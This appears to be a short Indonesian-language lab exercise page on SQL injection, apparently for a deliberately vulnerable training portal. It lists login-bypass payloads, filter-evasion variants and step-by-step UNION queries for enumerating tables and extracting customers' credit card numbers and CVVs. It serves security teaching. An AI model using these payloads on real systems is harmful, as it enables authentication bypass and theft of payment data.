Module 1: SQL Injection (SQLi)

Celah manipulasi query SQL pada otentikasi login dan fitur ekstraksi data rahasia.

OWASP Top 10: A03:2021-Injection
Form Login Portal Internal
Catatan Mentor:

Coba masukkan salah satu payload berikut pada kolom Username:

  • ' OR 1=1 -- (Bypass user pertama di tabel)
  • admin' -- (Login spesifik sebagai akun admin)
  • Jika WAF aktif: gunakan huruf kecil ' or 1=1 -- atau admin'/*comment*/--

Instruksi Latihan UNION SQLi untuk Peserta:
  1. Menentukan jumlah kolom: Coba ' ORDER BY 1 --, ' ORDER BY 5 --, hingga error di ' ORDER BY 6 -- (berarti ada 5 kolom).
  2. Mengetes tipe data kolom: ' UNION SELECT 1, 2, 3, 4, 5 --
  3. Ekstraksi Nama Tabel SQLite: ' UNION SELECT 1, tbl_name, 3, 4, sql FROM sqlite_master WHERE type='table' --
  4. Ekstraksi Kartu Kredit Nasabah: ' UNION SELECT id, full_name, email, credit_card, cvv FROM customers --
